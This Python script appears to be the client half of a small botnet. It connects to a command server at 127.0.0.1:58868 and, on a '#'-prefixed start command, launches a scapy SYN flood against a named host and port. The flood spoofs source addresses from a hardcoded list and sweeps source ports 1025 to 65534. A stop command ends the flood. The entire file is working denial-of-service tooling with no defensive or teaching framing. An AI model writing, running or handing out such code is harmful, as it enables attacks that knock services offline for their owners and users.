#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import socket
import sys
import random
import argparse
from multiprocessing import Process
from scapy.all import *
import os
import logging
import logging.config
logging.config.fileConfig("logger.conf")
logger = logging.getLogger("clientLogger")
isWorking = False
curProcess = None

#synFlood攻击
def synFlood(target, dPort):
	print('='*100)
	print('The syn Flood is running!')
	logging.info('The syn Flood is running!')
	print('='*100)
	srcList=['201.1.1.2','10.1.1.102','69.1.1.2','125.130.5.199']
	for sPort in range(1025,65535):
		index = random.randrange(4)
		ipLayer = IP(src=srcList[index],dst=target)
		tcpLayer = TCP(sport=sPort,dport=dPort,flags='S')
		packet = ipLayer/tcpLayer
		send(packet)


#处理命令
def cmdHandle(sock, parser):
	global curProcess
	while True:
		data = sock.recv(1024).decode('utf-8')
		if len(data)==0:
			print('The data is empty!')
			logging.error('The data received is empty!')
			return
		if data[0]=='#':
			try:
				options = parser.parse_args(data[1:].split())
				m_host = options.host
				m_port = options.port
				m_cmd = options.cmd
				if m_cmd.lower()=='start':
					if curProcess !=None and curProcess.is_alive():
						curProcess.terminate()
						curProcess = None
						os.system('clear')
						logging.info('stop current process to prepare for new process.')
					print('The synFlood is start')
					logging.info('The synFlood is start')
					p = Process(target=synFlood,args=(m_host,int(m_port)))
					p.start()
					curProcess = p
				elif m_cmd.lower() == 'stop':
					if curProcess !=None and curProcess.is_alive():
						curProcess.terminate()
						os.system('clear')
						logging.info('stop current process.')
			except (Exception) as e:
				print(e)
				print('Failed to perform the command!')
				logging.error('command format error.')


def main():
	p = argparse.ArgumentParser()
	p.add_argument('-H', dest='host',type=str)
	p.add_argument('-p', dest='port',type=str)
	p.add_argument('-c', dest='cmd', type=str)
	print('*'*40)
	try:
		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect(('127.0.0.1',58868))
		print('To connected server was success!')
		print('='*40)
		cmdHandle(s,p)
	except (Exception) as e:
		print (e)
		logging.error(e)
		print('The network connected failed!')
		print('Please restart the script')
		sys.exit(0)


if __name__=='__main__':
	main()
